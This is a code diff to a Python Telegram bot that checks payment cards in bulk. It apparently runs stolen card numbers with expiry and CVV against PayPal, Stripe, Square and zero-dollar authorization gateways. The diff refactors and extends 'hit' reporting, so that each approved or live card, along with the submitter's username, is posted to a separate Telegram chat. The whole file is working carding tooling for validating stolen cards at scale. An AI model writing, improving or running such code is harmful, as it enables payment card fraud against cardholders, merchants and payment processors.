@@ -942,6 +942,21 @@ def check_auth_sync(card):
         except:
             pass
 
+async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
+    """إرسال رسالة الهيت"""
+    hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
+- - - - - - - - - - - - - - - - - - - - - -
+⚡ 𝐔𝐬𝐞𝐫: @{username}
+⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
+⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
+⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
+- - - - - - - - - - - - - - - - - - - - -
+🤖 checker v1"""
+    try:
+        await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
+    except:
+        pass
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -1119,22 +1134,6 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • /code [key] - Activate VIP"""
     await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")
 
-async def get_gateway_name(gateway_url):
-    if not gateway_url:
-        return "Default"
-    if 'paypal' in gateway_url.lower():
-        return "PayPal"
-    elif 'stripe' in gateway_url.lower():
-        return "Stripe"
-    elif 'square' in gateway_url.lower():
-        return "Square"
-    elif 'auth' in gateway_url.lower():
-        return "Auth $0"
-    elif 'centrobill' in gateway_url.lower():
-        return "CentroBill"
-    else:
-        return "Unknown"
-
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter, gateway_index
     user_id = update.effective_user.id
@@ -1154,34 +1153,37 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_full = " ".join(context.args)
     gateway_num = 0
     gateway_url = None
+    gateway_name = "PayPal"
+    
     if GATEWAYS:
         gateway_num = (gateway_index % len(GATEWAYS)) + 1
         gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
         gateway_index += 1
+        
+        # ✅ تحديد نوع البوابة من الاختيار (افتراضي PayPal)
+        if 'stripe' in gateway_url.lower():
+            gateway_name = "Stripe"
+        elif 'square' in gateway_url.lower():
+            gateway_name = "Square"
+        elif 'auth' in gateway_url.lower():
+            gateway_name = "Auth $0"
     
     status, response = await check_card_api(card_full, gateway_url)
     text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
     await update.message.reply_text(text, parse_mode="HTML")
     
-    # ====== hit detection ======
+    # ====== إرسال الهيت ======
     if status == "approved" or status == "live":
         hit_counter += 1
-        username = update.effective_user.username or "Unknown"
-        status_text = "🔥 Charge" if status == "approved" else "💵 Insufficient Funds"
-        gateway_name = await get_gateway_name(gateway_url)
+        user = update.effective_user
+        username = user.username or user.first_name or "Unknown"
         
-        hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
-- - - - - - - - - - - - - - - - - - - - - -
-⚡ 𝐔𝐬𝐞𝐫: @{username}
-⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
-⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
-⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
-- - - - - - - - - - - - - - - - - - - - -
-🤖 checker v1"""
-        try:
-            await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
-        except:
-            pass
+        if status == "approved":
+            status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
+        else:
+            status_text = "💵 Insufficient Funds"
+        
+        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)
 
 async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
@@ -1343,24 +1345,14 @@ async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text(text, parse_mode="HTML")
 
     status = result_dict.get('status', 'declined')
-    if status == "approved" or status == "live":
+    if status == "approved":
         hit_counter += 1
-        username = update.effective_user.username or "Unknown"
-        status_text = "🔥 Approved" if status == "approved" else "💵 Live"
-        message = result_dict.get('message', '')
+        user = update.effective_user
+        username = user.username or user.first_name or "Unknown"
+        status_text = "🔥 Approved"
+        response = result_dict.get('message', '')
         gateway_name = "Auth $0"
-        hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
-- - - - - - - - - - - - - - - - - - - - - -
-⚡ 𝐔𝐬𝐞𝐫: @{username}
-⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
-⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{message}</code>
-⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
-- - - - - - - - - - - - - - - - - - - - -
-🤖 checker v1"""
-        try:
-            await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
-        except:
-            pass
+        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)
 
 async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -1441,24 +1433,40 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
     gateway_type = query.data.split("_")[1]
+    
     if user_id not in pending_files:
         await query.edit_message_text(premium_emoji("❌ File expired."), parse_mode="HTML")
         return
+    
+    # ✅ جلب اليوزر الحقيقي
+    user = query.from_user
+    username = user.username or user.first_name or "Unknown"
+    
     file_path = pending_files[user_id]["file_path"]
     chat_id = pending_files[user_id]["chat_id"]
     await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
+    
+    gateway_name_map = {
+        "paypal": "PayPal",
+        "stripe": "Stripe",
+        "square": "Square",
+        "auth": "Auth $0"
+    }
+    gateway_name = gateway_name_map.get(gateway_type, "Unknown")
+    
     if gateway_type == "paypal":
-        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context))
+        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context, gateway_name, username))
     elif gateway_type == "stripe":
-        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context))
+        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context, gateway_name, username))
     elif gateway_type == "square":
-        task = asyncio.create_task(process_square_file(file_path, chat_id, context))
+        task = asyncio.create_task(process_square_file(file_path, chat_id, context, gateway_name, username))
     elif gateway_type == "auth":
-        task = asyncio.create_task(process_auth_file(file_path, chat_id, context))
+        task = asyncio.create_task(process_auth_file(file_path, chat_id, context, gateway_name, username))
+    
     user_tasks[user_id] = task
     del pending_files[user_id]
 
-async def process_paypal_file(file_path, chat_id, context):
+async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal", username="Unknown"):
     global gateway_index, hit_counter
     user_id = chat_id
     stop_users[user_id] = False
@@ -1466,22 +1474,29 @@ async def process_paypal_file(file_path, chat_id, context):
         approved = live = declined = 0
         card_counter = 0
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
+        
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = f.readlines()
+        
         for line in lines:
             if stop_users.get(user_id):
                 await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                 return
+            
             match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
             if not match: continue
+            
             card_full = match[0]
             card_counter += 1
+            
             gateway_num = 0
             gateway_url = None
             if GATEWAYS:
                 gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                 gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
+            
             status, response = await check_card_api(card_full, gateway_url)
+            
             if status == "approved":
                 approved += 1
                 text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
@@ -1490,42 +1505,25 @@ async def process_paypal_file(file_path, chat_id, context):
                     await msg.pin(disable_notification=True)
                 except:
                     pass
+                
                 hit_counter += 1
-                gateway_name = await get_gateway_name(gateway_url)
-                hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
-- - - - - - - - - - - - - - - - - - - - - -
-⚡ 𝐔𝐬𝐞𝐫: @Unknown
-⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: 🔥 Charge
-⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
-⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
-- - - - - - - - - - - - - - - - - - - - -
-🤖 checker v1"""
-                try:
-                    await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
-                except:
-                    pass
+                status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
+                await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
+                
             elif status == "live":
                 live += 1
                 text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
+                
                 hit_counter += 1
-                gateway_name = await get_gateway_name(gateway_url)
-                hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
-- - - - - - - - - - - - - - - - - - - - - -
-⚡ 𝐔𝐬𝐞𝐫: @Unknown
-⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: 💵 Insufficient Funds
-⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
-⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
-- - - - - - - - - - - - - - - - - - - - -
-🤖 checker v1"""
-                try:
-                    await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
-                except:
-                    pass
+                status_text = "💵 Insufficient Funds"
+                await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
+                
             else:
                 declined += 1
+            
             panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-         ▬▬ [ MASS PAYPAL ] ▬▬
+         ▬▬ [ MASS {gateway_name.upper()} ] ▬▬
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 🔥 Charge: <code>{approved}</code>
 💵 Live: <code>{live}</code>
@@ -1533,20 +1531,23 @@ async def process_paypal_file(file_path, chat_id, context):
 📊 Total: <code>{approved + live + declined}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💳 Card #{card_counter}: <code>{card_full}</code>
-🌐 Gate: <code>{gateway_num}</code>
+🌐 Gateway: <code>{gateway_name}</code>
 ⚡ Response: <code>{response}</code>"""
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
             except:
                 pass
+            
             await asyncio.sleep(1)
-        await context.bot.send_message(chat_id, premium_emoji("🚀 PayPal complete."), parse_mode="HTML")
+        
+        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete."), parse_mode="HTML")
+        
     except asyncio.CancelledError:
         await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-async def process_stripe_file(file_path, chat_id, context):
+async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe", username="Unknown"):
     if not STRIPE_KEYS:
         await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
         return
@@ -1583,10 +1584,16 @@ async def process_stripe_file(file_path, chat_id, context):
                     await msg.pin(disable_notification=True)
                 except:
                     pass
+                hit_counter += 1
+                status_text = "🔥 Charge"
+                await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
                 live += 1
                 text = await format_stripe_response(card_full, result, 0, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
+                hit_counter += 1
+                status_text = "💵 Insufficient Funds"
+                await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             else:
                 declined += 1
             panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -1611,7 +1618,7 @@ async def process_stripe_file(file_path, chat_id, context):
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-async def process_square_file(file_path, chat_id, context):
+async def process_square_file(file_path, chat_id, context, gateway_name="Square", username="Unknown"):
     user_id = chat_id
     stop_users[user_id] = False
     try:
@@ -1638,10 +1645,16 @@ async def process_square_file(file_path, chat_id, context):
                     await msg.pin(disable_notification=True)
                 except:
                     pass
+                hit_counter += 1
+                status_text = "🔥 Charge"
+                await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             elif "LIVE" in result:
                 live += 1
                 text = await format_square_response(card_full, result, 0, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
+                hit_counter += 1
+                status_text = "💵 Insufficient Funds"
+                await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             else:
                 declined += 1
             panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -1665,7 +1678,7 @@ async def process_square_file(file_path, chat_id, context):
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-async def process_auth_file(file_path, chat_id, context):
+async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0", username="Unknown"):
     user_id = chat_id
     stop_users[user_id] = False
     try:
@@ -1693,10 +1706,16 @@ async def process_auth_file(file_path, chat_id, context):
                     await msg.pin(disable_notification=True)
                 except:
                     pass
+                hit_counter += 1
+                status_text = "🔥 Approved"
+                await send_hit(context, chat_id, hit_counter, username, status_text, result_dict.get('message', ''), gateway_name)
             elif status == "live":
                 live += 1
                 text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
+                hit_counter += 1
+                status_text = "💵 Insufficient Funds"
+                await send_hit(context, chat_id, hit_counter, username, status_text, result_dict.get('message', ''), gateway_name)
             else:
                 declined += 1
             message = result_dict.get('message', '')
